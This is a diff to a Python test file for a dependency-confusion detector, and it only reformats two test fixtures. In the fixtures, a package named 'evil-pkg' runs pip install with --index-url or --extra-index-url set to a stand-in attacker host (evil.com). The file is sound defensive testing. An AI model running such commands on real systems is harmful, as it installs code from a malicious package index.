@@ -731,7 +731,12 @@ class TestL4DependencyConfusion:
 
         profile = BehavioralProfile(
             package="evil-pkg",
-            spawns=[ProcessSpawn(executable="/usr/bin/pip", args=["install", "--index-url=http://evil.com/simple", "pkg"])],
+            spawns=[
+                ProcessSpawn(
+                    executable="/usr/bin/pip",
+                    args=["install", "--index-url=http://evil.com/simple", "pkg"],
+                ),
+            ],
             total_runtime_ms=100,
         )
         findings = detect_dependency_confusion(profile)
@@ -742,7 +747,12 @@ class TestL4DependencyConfusion:
 
         profile = BehavioralProfile(
             package="evil-pkg",
-            spawns=[ProcessSpawn(executable="/usr/bin/pip", args=["install", "--extra-index-url=http://evil.com/simple", "pkg"])],
+            spawns=[
+                ProcessSpawn(
+                    executable="/usr/bin/pip",
+                    args=["install", "--extra-index-url=http://evil.com/simple", "pkg"],
+                ),
+            ],
             total_runtime_ms=100,
         )
         findings = detect_dependency_confusion(profile)
